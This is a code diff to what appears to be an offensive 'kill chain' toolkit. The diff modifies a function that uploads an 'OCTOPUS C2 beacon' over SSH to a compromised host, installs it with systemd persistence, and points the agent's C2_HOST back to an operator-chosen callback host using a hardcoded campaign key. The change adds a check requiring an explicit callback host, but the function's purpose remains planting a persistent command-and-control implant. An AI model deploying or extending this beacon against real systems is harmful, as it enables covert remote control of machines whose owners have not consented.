@@ -22,6 +22,7 @@ except ImportError:
 
 from typing import Optional
 
+from core.execution.policy import normalize_host
 from core.killchain.ssh_helpers import _ssh_connect, _ssh_exec
 
 # ANSI Colors
@@ -52,11 +53,23 @@ def _get_our_ip() -> str:
 
 # C2 BEACON DEPLOYMENT
 
-def deploy_c2_beacon(host: str, user: str, password: str, port: int = 22) -> str:
+def deploy_c2_beacon(
+    host: str,
+    user: str,
+    password: str,
+    port: int = 22,
+    callback_host: str = "",
+) -> str:
     """
     Deploy the OCTOPUS C2 beacon to the compromised host.
     Uses base64 to upload the payload and systemd.py plugin for persistence.
     """
+    if not callback_host:
+        return "[!] C2 beacon deployment blocked: explicit callback_host is required."
+    try:
+        callback_host = normalize_host(callback_host)
+    except ValueError:
+        return "[!] C2 beacon deployment blocked: callback_host must be one host without URL syntax."
     print(f"\n  {C_MAGENTA}[KILL CHAIN] C2 Beacon Deployment — {user}@{host}{C_RESET}")
     output = f"[KILL CHAIN — C2 BEACON DEPLOYMENT — {user}@{host}:{port}]\n{'═' * 60}\n\n"
 
@@ -80,11 +93,10 @@ def deploy_c2_beacon(host: str, user: str, password: str, port: int = 22) -> str
             agent_code = f.read()
 
         # Configure agent to point back to our IP
-        our_ip = _get_our_ip()
-        if not our_ip:
-            our_ip = "127.0.0.1" # Fallback
-
-        agent_code = agent_code.replace('C2_HOST = "127.0.0.1"', f'C2_HOST = "{our_ip}"')
+        agent_code = agent_code.replace(
+            'C2_HOST = "127.0.0.1"',
+            f"C2_HOST = {callback_host!r}",
+        )
         # Use the hardcoded campaign PSK for now
         psk = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
         agent_code = agent_code.replace('psk: str,', f'psk: str = "{psk}",')
